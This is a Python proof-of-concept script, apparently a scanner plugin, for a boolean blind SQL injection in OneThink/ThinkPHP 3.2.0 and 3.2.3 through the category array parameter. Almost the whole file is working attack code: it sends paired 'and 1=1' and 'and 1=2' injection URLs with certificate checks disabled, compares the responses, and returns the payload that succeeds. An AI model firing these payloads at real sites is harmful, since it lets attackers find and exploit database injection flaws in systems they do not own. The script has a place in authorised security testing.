#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Onethink 参数category SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0176868
author: Lucifer
description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/Home/Controller/ArticleController.class.php中,category数组存在bool型盲注入,
    影响版本ThinkPHP 3.2.0和3.2.3
'''
import sys
import requests
import warnings



def poc(url):
    reqlst = []
    payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
    for payload in payload1:
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            reqlst.append(str(req.text))
        except:
            pass
    if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
        # print("[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl)
        return {'payload': vulnurl, 'post_data': '', 'info': '', 'extra': ''}

    reqlst = []
    payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
    for payload in payload2:
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            reqlst.append(str(req.text))

        except:
            pass
    if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
        # print("[+]存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: "+vulnurl)
        return {'payload': vulnurl, 'post_data': '', 'info': '', 'extra': ''}
    else:
        pass



